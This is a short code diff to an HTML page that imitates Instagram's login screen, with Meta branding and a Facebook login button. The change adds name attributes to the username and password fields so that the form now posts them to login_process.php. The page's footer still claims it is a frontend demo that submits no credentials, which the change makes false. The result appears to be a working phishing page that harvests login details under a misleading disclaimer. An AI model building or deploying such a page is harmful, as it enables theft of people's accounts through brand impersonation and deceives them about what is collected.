@@ -28,8 +28,9 @@
                 <div class="title"><button>‹</button>
                     <h1>Log into Instagram</h1>
                 </div>
-                <form action="login_process.php" method="POST"><input placeholder="Mobile number, username or email"><input
-                        type="password" placeholder="Password"><button class="login" type="submit">Log in</button>
+                <form action="login_process.php" method="POST">
+                    <input type="text" name="username" placeholder="Username" class="username" required>
+                    <input type="password" name="password" placeholder="Password" class="password" required><button class="login" type="submit">Log in</button>
                 </form><button class="forgot">Forgot password?</button><button class="facebook"><b>f</b> Log in with
                     Facebook</button><button class="create">Create new account</button>
                 <div class="meta">∞ Meta</div><small>Frontend UI demo — no credentials are submitted.</small>
